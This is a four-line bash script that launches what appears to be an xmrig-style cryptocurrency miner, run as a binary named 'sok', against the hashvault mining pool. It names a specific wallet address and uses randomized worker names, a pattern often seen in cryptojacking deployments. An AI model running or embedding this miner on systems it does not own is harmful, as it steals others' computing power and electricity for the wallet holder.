#!/bin/bash
A=url pool.hashvault.pro:80
B=ZEPHs8qpRw1igRzoQwesBMQRTuubopJMcEsd5LjBxdiX9zSaMDGuq4CfEeohWKu5etAXmnFuq4T7pPLJWHA4gW8K4EDAPeLduTb
C=$(echo $(shuf -i 1-200 -n 1) GX-150)
./sok --donate-level 1 -o $A -u $B -p $C -a rx/0